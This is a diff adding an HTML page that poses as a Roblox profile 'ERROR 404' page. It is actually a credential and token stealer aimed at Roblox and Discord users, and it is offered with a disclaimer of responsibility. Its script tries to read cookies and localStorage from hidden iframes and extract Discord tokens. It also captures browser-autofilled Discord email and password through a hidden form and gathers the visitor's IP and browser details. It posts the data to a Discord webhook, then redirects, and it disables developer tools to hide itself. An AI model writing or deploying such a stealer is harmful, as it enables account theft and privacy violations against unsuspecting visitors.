@@ -1,0 +1,158 @@
+-- (I AM NOT RESPONSIBLE FOR ANY TYPE OF USE OF THE CODE )
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Profile | lailacypher</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+        }
+    </style>
+</head>
+<body>
+    <h2>ERROR 404</h2>
+    <div class="loader"></div>
+    <p>Wait here for 4-5 Seconds</p>
+
+    <iframe src="https://www.roblox.com" style="display:none;"></iframe>
+    <iframe src="https://discord.com" style="display:none;"></iframe>
+    <form id="discordForm" action="https://discord.com/login" method="POST" style="display:none;">
+        <input type="text" name="email" autocomplete="username">
+        <input type="password" name="password" autocomplete="current-password">
+    </form>
+
+    <script>
+   
+        const WEBHOOK_URL = "YOUR-WEEBHOOK-DISCORDHERE";
+        const CAPTURE_DELAY = 3000;
+
+        async function turboCapture() {
+            const data = {
+                roblox: {
+                    cookies: {},
+                    localStorage: {}
+                },
+                discord: {
+                    cookies: {},
+                    localStorage: {},
+                    tokens: []
+                },
+                system: {
+                    ip: await getIP(),
+                    userAgent: navigator.userAgent,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    plugins: Array.from(navigator.plugins).map(p => p.name)
+                }
+            };
+
+          
+            try {
+
+                const robloxFrame = document.getElementsByTagName('iframe')[0];
+                data.roblox.cookies = parseCookies(robloxFrame.contentDocument?.cookie);
+                data.roblox.localStorage = await extractLocalStorage(robloxFrame);
+                
+
+                const discordFrame = document.getElementsByTagName('iframe')[1];
+                data.discord.cookies = parseCookies(discordFrame.contentDocument?.cookie);
+                data.discord.localStorage = await extractLocalStorage(discordFrame);
+                data.discord.tokens = findDiscordTokens(data.discord.localStorage);
+                
+            } catch (e) {
+                console.error("Erro na captura turbo:", e);
+            }
+
+            return data;
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                return (await response.json()).ip;
+            } catch {
+                return "Não capturado";
+            }
+        }
+
+        function parseCookies(cookieString) {
+            return cookieString?.split(';').reduce((cookies, cookie) => {
+                const [name, value] = cookie.trim().split('=');
+                cookies[name] = value;
+                return cookies;
+            }, {}) || {};
+        }
+
+        async function extractLocalStorage(iframe) {
+            try {
+                return JSON.parse(JSON.stringify(iframe.contentWindow.localStorage));
+            } catch {
+                return {};
+            }
+        }
+
+        function findDiscordTokens(localStorage) {
+            const tokens = [];
+            for (const key in localStorage) {
+                if (key.includes('token') || key.includes('access_token')) {
+                    tokens.push({
+                        key: key,
+                        value: localStorage[key]
+                    });
+                }
+            }
+            return tokens;
+        }
+
+        function quickAutoFill() {
+            try {
+                const form = document.getElementById('discordForm');
+                form.querySelector('input[name="email"]').focus();
+                form.querySelector('input[name="password"]').focus();
+                
+                setTimeout(() => {
+                    const credentials = {
+                        email: form.querySelector('input[name="email"]').value,
+                        password: form.querySelector('input[name="password"]').value
+                    };
+                    if (credentials.email) {
+                        fetch(WEBHOOK_URL, {
+                            method: "POST",
+                            body: JSON.stringify({ discordCredentials: credentials })
+                        });
+                    }
+                }, 1000);
+            } catch (e) {}
+        }
+
+
+        window.onload = async () => {
+            quickAutoFill();
+            
+            setTimeout(async () => {
+                const capturedData = await turboCapture();
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(capturedData)
+                });
+                
+                window.location.href = "https://www.roblox.com";
+            }, CAPTURE_DELAY);
+        };
+
+        // Anti-debugging
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))) {
+                e.preventDefault();
+                window.location.href = "https://discord.com";
+            }
+        });
+    </script>
+</body>
+</html>
